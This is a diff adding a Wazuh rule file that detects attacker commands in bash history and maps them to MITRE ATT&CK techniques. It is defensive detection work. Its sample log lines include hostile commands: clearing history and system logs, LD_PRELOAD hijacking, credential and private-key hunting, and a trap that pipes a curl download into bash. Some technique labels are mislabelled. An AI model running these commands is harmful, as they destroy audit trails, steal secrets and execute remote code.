@@ -1,0 +1,448 @@
+<!--
+Must include in configuration (creation of a group to include agents must be mandatory depending your case)
+
+<localfile>
+  <log_format>syslog</log_format>
+  <location>/root/.bash_history</location>
+  <out_format>$(timestamp) $(hostname) bash_history: $(log)</out_format>
+</localfile>
+
+
+<location> tag can be modified f.ex. to log any user commands <location>/home/testuser/.bash_history</location>
+
+<out_format> tag modifies the output log format, with this config getting format samples like:  
+
+Mar 17 23:23:23 Test bash_history: vi /var/ossec/logs/ossec.log
+
+Mar 17 23:23:23 Test bash_history: history
+Mar 17 23:32:23 Test bash_history: cat wazuh.list
+Mar 17 23:23:23 Test bash_history: cp /tmp/test.txt /var/ossec/etc/test.txt
+Mar 17 23:23:23 Test bash_history: ls -lrt | grep 'manolo'
+Mar 17 23:23:23 Test bash_history: dd if=/dev/zero bs=1 count=1 >> /tmp
+
+-->
+<group name="command_rules">
+
+  <rule id="203000" level="0">
+    <decoded_as>bash_history</decoded_as>
+    <description>Command executed and recorded in bash file</description>
+  </rule>
+
+<!-- Defense Evasion -->
+
+<!--
+Mar 17 23:23:23 Test bash_history: dd if=/dev/zero bs=1 count=1 >> /tmp/path
+-->
+
+  <rule id="203001" level="7">
+    <if_sid>203000</if_sid>
+	<field name="fields.command">dd</field>
+	<field name="fields.flag_2">if=/dev/zero</field>
+    <description>Mitre ATT&CK T1027.001, Defense Evasion , Obfuscated Files or Information: Binary Padding, Posible increase of file size in order to change file hash</description>
+	<!--
+	<mitre>
+      <id>T1027.001</id>
+    </mitre>
+	-->
+  </rule>
+  
+<!--
+Mar 17 23:23:23 Test bash_history: rm ~/.bash_history
+Mar 17 23:23:23 Test bash_history: echo " " > .bash_history
+Mar 17 23:23:23 Test bash_history: truncate -s0 ~/.bash_history
+-->
+
+  <rule id="203002" level="7">
+    <if_sid>203000</if_sid>
+	<field name="fields.command">^rm$|echo|truncate</field>
+	<field name="fields.flag_1">\.*.bash_history</field>
+    <description>Mitre ATT&CK T1070.003, Defense Evasion , Indicator Removal on Host: Clear Command History, Manually remove user bash_history</description>
+	<!--
+	<mitre>
+      <id>T1070.003</id>
+    </mitre>
+	-->
+  </rule>
+ 
+<!--
+Mar 17 23:23:23 Test bash_history: cat /dev/null > ~/.bash_history
+-->
+  
+  <rule id="203003" level="7">
+    <if_sid>203000</if_sid>
+	<field name="fields.command">cat</field>
+	<field name="fields.flag_2">/dev/null</field>
+	<field name="fields.flag_1">\.*.bash_history</field>
+    <description>Mitre ATT&CK T1070.003, Defense Evasion , Indicator Removal on Host: Clear Command History, Manually remove user bash_history</description>
+	<!--
+	<mitre>
+      <id>T1070.003</id>
+    </mitre>
+	-->
+  </rule>  
+
+
+<!--
+Mar 17 23:23:23 Test bash_history: ln -sf /dev/null ~/.bash_history
+-->
+
+  <rule id="203004" level="7">
+    <if_sid>203000</if_sid>
+	<field name="fields.command">ln</field>
+	<field name="fields.flag_3">/dev/null</field>
+	<field name="fields.flag_1">\.*.bash_history</field>
+    <description>Mitre ATT&CK T1070.003, Defense Evasion , Indicator Removal on Host: Clear Command History, Manually remove user bash_history</description>
+	<!--
+	<mitre>
+      <id>T1070.003</id>
+    </mitre>
+	-->
+  </rule>  
+
+
+<!-- 
+Mar 17 23:23:23 Test bash_history: unset HISTFILE
+-->
+
+  <rule id="203005" level="7">
+    <if_sid>203000</if_sid>
+	<field name="fields.command">unset</field>
+	<field name="fields.flag_1">HISTFILE</field>
+    <description>Mitre ATT&CK T1070.003, Defense Evasion , Indicator Removal on Host: Clear Command History, Manually remove user bash_history</description>
+	<!--
+	<mitre>
+      <id>T1070.003</id>
+    </mitre>
+	-->
+  </rule>  
+
+
+<!--
+Mar 17 23:23:23 Test bash_history: export HISTFILESIZE=0
+-->
+
+  <rule id="203006" level="7">
+    <if_sid>203000</if_sid>
+	<field name="fields.command">export</field>
+	<field name="fields.flag_1">HISTFILESIZE=0</field>
+    <description>Mitre ATT&CK T1070.003, Defense Evasion , Indicator Removal on Host: Clear Command History, Manually remove user bash_history</description>
+	<!--
+	<mitre>
+      <id>T1070.003</id>
+    </mitre>
+	-->
+  </rule>  
+
+
+<!--
+Mar 17 23:23:23 Test bash_history: history -c
+-->
+
+  <rule id="203007" level="7">
+    <if_sid>203000</if_sid>
+	<field name="fields.command">history</field>
+	<field name="fields.flag_1">-c</field>
+    <description>Mitre ATT&CK T1070.003, Defense Evasion , Indicator Removal on Host: Clear Command History, Manually remove user bash_history</description>
+	<!--
+	<mitre>
+      <id>T1070.003</id>
+    </mitre>
+	-->
+  </rule>  
+  
+<!--
+Mar 17 23:23:23 Test bash_history: rm -rf test1.text
+Mar 17 23:23:23 Test bash_history: rm -f test1.txt
+-->  
+
+  <rule id="203008" level="7">
+    <if_sid>203000</if_sid>
+	<field name="fields.command">^rm$</field>
+	<field name="fields.flag_4">-rf|-f</field>
+    <description>Mitre ATT&CK T1070.004, Defense Evasion , Indicator Removal on Host: File Deletion, Manually remove file $(fields.flag_1)</description>
+	<!--
+	<mitre>
+      <id>T1070.003</id>
+    </mitre>
+	-->
+  </rule> 
+
+<!--
+Mar 17 23:23:23 Test bash_history: shred -u test1.txt
+-->
+
+  <rule id="203009" level="7">
+    <if_sid>203000</if_sid>
+	<field name="fields.command">shred</field>
+	<field name="fields.flag_4">-u</field>
+    <description>Mitre ATT&CK T1070.004, Defense Evasion , Indicator Removal on Host: File Deletion, Manually remove file $(fields.flag_1)</description>
+	<!--
+	<mitre>
+      <id>T1070.003</id>
+    </mitre>
+	-->
+  </rule> 
+
+<!--
+Mar 17 23:23:23 Test bash_history: chmod 766 test1.txt
+Mar 17 23:23:23 Test bash_history: chown ec2-user:ec2-user test1.txt
+-->
+
+  <rule id="203010" level="7">
+    <if_sid>203000</if_sid>
+	<field name="fields.command">chmod|chown</field>
+	<description>Mitre ATT&CK T1222.002, Defense Evasion , File and Directory Permissions Modification: Linux File and Directory Permissions Modification </description>
+	<!--
+	<mitre>
+      <id>T1222.002</id>
+    </mitre>
+	-->
+  </rule> 
+
+<!--
+Mar 17 23:23:23 Test bash_history: mkdir .hidden-directory
+Mar 17 23:23:23 Test bash_history: mv filetoa .file
+-->
+
+  <rule id="203011" level="7">
+    <if_sid>203000</if_sid>
+	<field name="fields.command">mkdir|mv</field>
+	<field name="fields.flag_1">.\.*</field>
+	<description>Mitre ATT&CK T1564.001, Defense Evasion , Hide Artifacts: Hidden Files and Directories </description>
+	<!--
+	<mitre>
+      <id>T1564.001</id>
+    </mitre>
+	-->
+  </rule> 
+
+<!--
+Mar 17 23:23:23 Test bash_history: export HISTCONTROL=ignoreboth
+-->
+  <rule id="203012" level="7">
+    <if_sid>203000</if_sid>
+	<field name="fields.command">export</field>
+	<field name="fields.flag_1">HISTCONTROL\.*</field>
+	<description>Mitre ATT&CK T1562.003, Defense Evasion , Impair Defenses: Impair Command History Logging  </description>
+	<!--
+	<mitre>
+      <id>T1562.003</id>
+    </mitre>
+	-->
+  </rule>
+
+<!--
+Mar 17 23:23:23 Test bash_history: rm -rf /var/log/*
+-->
+
+  <rule id="203013" level="7">
+    <if_sid>203000</if_sid>
+	<field name="fields.command">rm</field>
+	<field name="fields.flag_1">/var/log/*</field>
+	<field name="fields.flag_4">-rf</field>
+	<description>Mitre ATT&CK T1070.002, Defense Evasion , Indicator Removal on Host: Clear Linux System Logs</description>
+	<!--
+	<mitre>
+      <id>T1070.002</id>
+    </mitre>
+	-->
+  </rule>
+  
+<!--
+Mar 17 23:23:23 Test bash_history: echo /home/$USER/random.so > /etc/ld.so.preload
+-->  
+
+  <rule id="203014" level="7">
+    <if_sid>203000</if_sid>
+	<field name="fields.command">echo</field>
+	<field name="fields.flag_1">/etc/ld.so.preload</field>
+	<description>Mitre ATT&CK T1574.006, Defense Evasion , Hijack Execution Flow: LD_PRELOAD</description>
+	<!--
+	<mitre>
+      <id>T1574.006</id>
+    </mitre>
+	-->
+  </rule>
+  
+<!-- Discovery -->
+
+<!--
+Mar 17 23:23:23 Test bash_history: tcpdump -c 5 -nnni interface
+Mar 17 23:23:23 Test bash_history: tshark -c 5 -i interface
+-->
+
+  <rule id="203030" level="7">
+    <if_sid>203000</if_sid>
+	<field name="fields.command">tcpdump|tshark</field>
+	<description>Mitre ATT&CK T1040, Defense Evasion , Network Sniffing</description>
+	<!--
+	<mitre>
+      <id>T1040</id>
+    </mitre>
+	-->
+  </rule>
+
+<!--
+Mar 17 23:23:23 Test bash_history: cat /etc/passwd > output_file
+Mar 17 23:23:23 Test bash_history: cat /etc/sudoers > output_file
+--> 
+
+  <rule id="203031" level="7">
+    <if_sid>203000</if_sid>
+	<field name="fields.command">^cat$</field>
+	<field name="fields.flag_2">/etc/passwd|/etc/sudoers</field>
+	<description>Mitre ATT&CK T1087.001, Defense Evasion , Account Discovery: Local Account </description>
+	<!--
+	<mitre>
+      <id>T1087.001</id>
+    </mitre>
+	-->
+  </rule>
+  
+<!--
+Mar 17 23:23:23 Test bash_history: groups 
+-->
+
+  <rule id="203032" level="7">
+    <if_sid>203000</if_sid>
+	<field name="fields.command">groups</field>
+	<description>Mitre ATT&CK T1087.001, Defense Evasion , Account Discovery: Local Account </description>
+	<!--
+	<mitre>
+      <id>T1087.001</id>
+    </mitre>
+	-->
+  </rule>
+ 
+<!-- Privilege Escalation --> 
+
+<!--
+Mar 17 23:23:23 Test bash_history: sudo su -
+-->
+
+  <rule id="203050" level="7">
+    <if_sid>203000</if_sid>
+	<field name="fields.command">sudo</field>
+	<description>Mitre ATT&CK T1548.003, Privilege Escalation, Abuse Elevation Control Mechanism: Sudo and Sudo Caching</description>
+	<!--
+	<mitre>
+      <id>T1548.003</id>
+    </mitre>
+	-->
+  </rule>
+  
+<!-- Credential Access -->
+  
+<!--
+Mar 17 23:23:23 Test bash_history: cat .bash_history | grep password > bash.txt
+-->  
+
+  <rule id="203070" level="7">
+    <if_sid>203000</if_sid>
+	<field name="fields.command">^cat$</field>
+	<field name="fields.flag_2">\.*.bash_history</field>
+	<description>Mitre ATT&CK T1552.003, Credential Access, Unsecured Credentials: Bash History</description>
+	<!--
+	<mitre>
+      <id>T1552.003</id>
+    </mitre>
+	-->
+  </rule>
+  
+<!--
+Mar 17 23:23:23 Test bash_history: grep -i user filename
+Mar 17 23:23:23 Test bash_history: grep -riP password /
+-->
+
+  <rule id="203071" level="7">
+    <if_sid>203000</if_sid>
+	<field name="fields.command">grep</field>
+	<field name="fields.flag_3">password|user|pass</field>
+	<description>Mitre ATT&CK T1552.001, Credential Access, Unsecured Credentials: Credentials In Files</description>
+	<!--
+	<mitre>
+      <id>T1548.003</id>
+    </mitre>
+	-->
+  </rule>
+
+<!--
+Mar 17 23:23:23 Test bash_history: find / -type f -name ".pem"
+Mar 17 23:23:23 Test bash_history: find / -type f -name ".pem" -o -name ".pgp" -o -name ".gpg" -o -name ".ppk" -o -name ".p12" -o -name ".key" -o -name ".pfx" -o -name ".cer" -o -name ".p7b" -o -name ".asc" -o -name "authorized*"
+-->
+
+  <rule id="203072" level="7">
+    <if_sid>203000</if_sid>
+	<field name="fields.command">find</field>
+	<field name="fields.flag_1">.pem|.pgp|.gpg|.ppk|.p12|.pfx|.key|.cer|.p7b|.asc|authorized*</field>
+	<description>Mitre ATT&CK T1552.004, Credential Access, Unsecured Credentials: Private Keys</description>
+	<!--
+	<mitre>
+      <id>T1552.004</id>
+    </mitre>
+	-->
+  </rule>
+
+<!-- Persistence -->
+
+<!-- 
+Mar 17 23:23:23 Test bash_history: at now + 1 minute -f script.sh
+-->
+
+  <rule id="203090" level="7">
+    <if_sid>203000</if_sid>
+	<field name="fields.command">^at$</field>
+	<description>Mitre ATT&CK T1053.001, Persistence, Scheduled Task/Job: At (Linux)</description>
+	<!--
+	<mitre>
+      <id>T1053.001</id>
+    </mitre>
+	-->
+  </rule>
+  
+<!--
+Mar 17 23:23:23 Test bash_history: crontab -e
+-->
+
+  <rule id="203091" level="7">
+    <if_sid>203000</if_sid>
+	<field name="fields.command">crontab</field>
+	<description>Mitre ATT&CK T1053.003, Persistence, Scheduled Task/Job: Cron</description>
+	<!--
+	<mitre>
+      <id>T1053.001</id>
+    </mitre>
+	-->
+  </rule>
+  
+<!--
+Mar 17 23:23:23 Test bash_history: trap 'nohup curl -sS https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1154/echo-art-fish.sh | bash' INT
+-->  
+  
+  <rule id="203092" level="7">
+    <if_sid>203000</if_sid>
+	<field name="fields.command">trap</field>
+	<description>Mitre ATT&CK T1546.005, Persistence, Event Triggered Execution: Trap</description>
+	<!--
+	<mitre>
+      <id>T1546.005</id>
+    </mitre>
+	-->
+  </rule>
+
+<!--
+Mar 17 23:23:23 Test bash_history: useradd -M -N -r -s /bin/bash test
+-->
+
+  <rule id="203093" level="7">
+    <if_sid>203000</if_sid>
+	<field name="fields.command">useradd</field>
+	<description>Mitre ATT&CK T1136, Persistence, Create Account</description>
+	<!--
+	<mitre>
+      <id>T1136</id>
+    </mitre>
+	-->
+  </rule>
+
+</group>
